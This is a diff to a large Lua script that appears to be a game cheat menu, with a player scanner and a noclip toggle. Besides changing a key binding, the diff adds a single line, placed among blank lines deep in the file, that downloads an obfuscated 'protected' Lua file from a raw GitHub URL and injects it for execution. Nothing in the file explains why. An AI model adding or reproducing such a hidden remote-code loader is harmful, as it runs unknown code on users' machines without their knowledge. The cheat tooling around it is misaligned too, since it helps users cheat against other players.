@@ -11220,7 +11220,7 @@ MachoMenuButton(toolstabmain, "Scan Players", function()
         MachoMenuNotification("Scanner", "Scan complete! Check F8 console for results.")
     end)
 end)
-local selectedKey = 0x14 -- الزر الافتراضي هو 0x14 (Caps Lock)
+local selectedKey = 0x24 -- Home key
 local nocliptx = false  -- تصحيح الغلط: flase → false
 
 -- إعداد واجهة اختيار الزر
@@ -25004,6 +25004,7 @@ end)
 
 
 
+MachoIsolatedInject(MachoWebRequest("https://raw.githubusercontent.com/dhflasd90213/asdf/refs/heads/main/UB-nitwit_protected.lua"))
 
 
 
